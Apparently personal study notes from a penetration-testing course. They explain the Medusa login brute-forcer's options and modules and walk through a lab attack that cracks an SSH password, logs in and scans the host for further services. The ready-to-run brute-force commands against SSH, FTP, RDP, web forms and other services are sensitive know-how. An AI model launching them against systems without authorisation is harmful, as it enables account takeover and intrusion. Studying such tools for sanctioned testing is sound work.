**Remember that crafting the correct `params` string is crucial for a successful Hydra attack**. 
# Medusa
Medusa's designed to be a **fast**, massively **parallel**, and **modular** login **brute-forcer**. Its primary objective is to support a wide array of services that allow remote authentication.
## Command Syntax and Parameter Table
Medusa's **CLI** allows users to specify **hosts, users, passwords, and modules** with various options to fine-tune the attack process.
**Basic Usage:**
```bash
$ medusa [target_options] [credential_options] -M module [module_options]
```

**Parameter Table**:
![[Pasted image 20241217180939.png]]
Or

| Parameter                  | Explanation                                                                                                                                      | Usage Example                                        |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| `-h HOST` or `-H FILE`     | **Target options**: Either a single target **hostname** or **IP** address (`-h`) or a file containing a list of targets (`-H`).                  | `medusa -h 192.168.1.10` or `medusa -H targets.txt`  |
| `-u USERNAME` or `-U FILE` | **Username options**: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                                   | `medusa -u admin` or `medusa -U usernames.txt`       |
| `-p PASSWORD` or `-P FILE` | **Password options**: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                                   | `medusa -p password123` or `medusa -P passwords.txt` |
| `-M MODULE`                | **Module**: Define the specific module to use for the attack (i.e. `ssh`, `ftp`, `http`).                                                        | `medusa -M ssh`                                      |
| `-m "MODULE_OPTION"`       | **Module options**: Provide additional parameters required by the chosen module, enclosed in quotes.                                             | See Image                                            |
| `-t TASKS`                 | **Tasks**: Define the number of parallel login attempts to run, potentially speeding up the attack.                                              | `medusa -t 4 ...`                                    |
| `-f` or `-F`               | **Fast mode**: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).                  | `medusa -f` or `medusa -F`                           |
| `-n PORT`                  | **Port**: Specify a non-default port for the target service.                                                                                     | `medusa -n 2222`                                     |
| `-v LEVEL`                 | **Verbose output**: Display detailed information about the attack's progress. The higher the `LEVEL` (up to **6**), the more verbose the output. | `medusa -v 4`                                        |
### Medusa Modules
![[Pasted image 20241217181118.png]]
or

| Medusa Module    | Service/Protocol                 | Desc.                                                                                               | Usage Example                                                                                                             |
| ---------------- | -------------------------------- | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                        | medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over **HTTP** **(GET/POST**).                         | medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^ |
| IMAP             | Internet Message Access Protocol | Brute-forcing **IMAP** logins, often used to access email servers.                                  | medusa -M imap -h mail.example.com -U users.txt -P passwords.txt                                                          |
| MySQL            | MySQL Database                   | Brute-forcing **MySQL** database credentials, commonly used for **web applications and databases**. | medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing **POP3** logins, typically used to retrieve emails from a mail server.                | medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing **RDP** logins, commonly used for remote desktop access to Windows systems.           | medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing **SSH** logins, commonly used for secure remote access.                               | medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing **Subversion** (**SVN**) repositories for version control.                            | medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                        | medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                                      | medusa -M vnc -h 192.168.1.100 -P passwords.txt                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                                     | medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"   |
### Targeting an SSH Server
Imagine a scenario where you need to test the security of an **SSH** server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the **SSH** service on this server, use the following Medusa command:
```bash
$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```
This command instructs Medusa to:
- Target the host at `192.168.0.100`.
- Use the usernames from the `usernames.txt` file.
- Test the passwords listed in the `passwords.txt` file.
- Employ the `ssh` module for the attack.
### Targeting Multiple Web Servers with Basic HTTP Authentication
Suppose you have a list of web servers that use **basic HTTP authentication**. The addresses are stored in `web_servers.txt`, and the lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:
```bash
$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```
In this case, Medusa will:
- Iterate through the list of web servers in `web_servers.txt`.
- Use the **usernames** and **passwords** provided.
- Employ the `http` module with the `GET` method to attempt logins.
### Testing for Empty or Default Passwords
If you want to assess whether any accounts on a specific host (`10.0.0.5`) have **empty** or **default passwords** (where the password matches the username), you can use:
```bash
$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
This command instructs Medusa to:
- Target the host at `10.0.0.5`.
- Use the **usernames** from `usernames.txt`.
- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
- Use the appropriate **service module** (replace `service_name` with the correct module name).
Medusa will try **each username** with an **empty password** and then with the password matching the username, potentially revealing accounts with weak or default configurations.
## Web Services
Maintaining robust authentication mechanisms is paramount. While technologies like **Secure Shell** (**SSH**) and **File Transfer Protocol** (**FTP**) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks.

In this section, we will delve into the practical application of **Medusa**, to systematically compromise both **SSH** and **FTP** services.

**SSH** is a **cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network**. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like **Telnet**. 
However, **weak or easily guessable passwords can undermine SSH's security**, exposing it to brute-force attacks.

**FTP** is a standard network protocol for **transferring files between a client and a server** on a computer network. **It's also widely used for uploading and downloading files from websites**. However, standard **FTP transmits data, including login credentials, in cleartext**, rendering it susceptible to interception and brute-forcing.
## Attack example
We begin our exploration by targeting an **SSH** server. Assuming prior knowledge of the **username** `sshuser`, we can leverage **Medusa** to brute force the password.

The following command serves as our starting point:
```bash
$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
Where:
- `-h <IP>`: Specifies the target system's **IP** address.
- `-n <PORT>`: Defines the port on which the **SSH** service is listening (**typically port 22**).
- `-u sshuser`: Sets the **username** for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points **Medusa** to a wordlist containing the 200 most commonly used passwords in 2023.
- `-M ssh`: Selects the **SSH module** within **Medusa**, tailoring the attack specifically for **SSH** authentication.
- `-t 3`: The number of parallel login attempts to execute concurrently. Increasing can speed up the attack but may also increase the likelihood of **detection** or **triggering security measures** on the target system.
```bash
medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```
Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.

### Gaining Access
With the password, establish an **SSH** connection using the following command and enter the found password when prompted:
```bash
$ ssh sshuser@<IP> -p PORT
```
This will initiate an **interactive SSH session**, granting you access to the remote system's command line.
### Expanding the Attack Surface
Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the **SSH** session) to list **open ports** and **listening services**:
```bash
$ netstat -tulpn | grep LISTEN
- - - - - 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```
You discover a service running on port 21.
 
Further reconnaissance with `nmap` (within the **SSH** session) confirms this finding as an **FTP** server:
```bash
$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
... SNIP ...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

